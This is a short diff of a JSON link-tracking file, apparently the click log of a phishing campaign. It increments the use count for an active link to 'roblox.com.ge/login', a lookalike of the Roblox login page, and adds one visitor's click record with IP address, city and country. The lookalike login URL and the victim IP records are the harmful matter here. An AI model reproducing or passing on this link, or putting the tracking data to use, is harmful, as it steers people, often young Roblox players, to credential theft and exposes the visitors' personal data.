@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1042,
+    "useCount": 1043,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8456,6 +8456,14 @@
         "city": "Lodz",
         "flag": "🇵🇱",
         "countryCode": "PL"
+      },
+      {
+        "timestamp": 1777234550697,
+        "ip": "190.43.252.68",
+        "country": "Peru",
+        "city": "Huánuco",
+        "flag": "🇵🇪",
+        "countryCode": "PE"
       }
     ]
   },
